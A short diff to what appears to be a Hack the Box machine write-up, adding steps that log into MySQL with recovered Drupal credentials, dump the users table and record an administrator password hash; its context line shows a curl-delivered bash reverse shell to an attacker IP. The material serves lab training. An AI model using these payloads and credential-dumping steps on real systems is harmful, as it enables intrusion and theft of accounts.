@@ -133,4 +133,16 @@ root@kali# curl -G --data-urlencode "c=bash -i >& /dev/tcp/10.10.14.10/443 0>&1"
 Creds: drupaluser:CQHEy@9M*m23gBVj
 ```
 
+## MySQL
+```shell
+bash-4.2$ mysql -e 'show tables;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
+```
 
+```shell
+mysql -e 'select * from users;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5bb2555b-8c25-4a61-83b6-cf15216edb4f)
+
+```shell
+Creds: brucetherealadmin:$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
+```
